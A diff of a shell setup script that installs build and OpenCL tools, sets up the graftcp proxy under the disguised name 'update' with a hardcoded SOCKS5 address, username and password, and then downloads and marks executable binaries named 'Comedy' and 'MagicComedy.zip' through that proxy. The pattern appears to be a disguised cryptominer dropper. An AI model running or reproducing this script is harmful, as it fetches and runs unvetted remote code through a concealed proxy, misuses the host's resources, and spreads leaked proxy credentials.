@@ -4,15 +4,15 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://raw.githubusercontent.com/nathanfleight/update/main/update.tar.gz && tar -xvzf update.tar.gz
 
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
+cat > update/local/update-local.conf <<END
+ listen = :2233
 loglevel = 1
 socks5 = 23.229.122.231:8259
 socks5_username = kanglahem
 socks5_password = Katrok1234
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+./update/local/update-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
@@ -21,7 +21,7 @@ echo " "
 
 echo ""
 
-./graftcp/graftcp curl ifconfig.me
+./update/update curl ifconfig.me
 
 echo " "
 echo " "
@@ -31,7 +31,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/Comedy 
+./update/update wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/Comedy 
 chmod +x Comedy 
  
 ./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
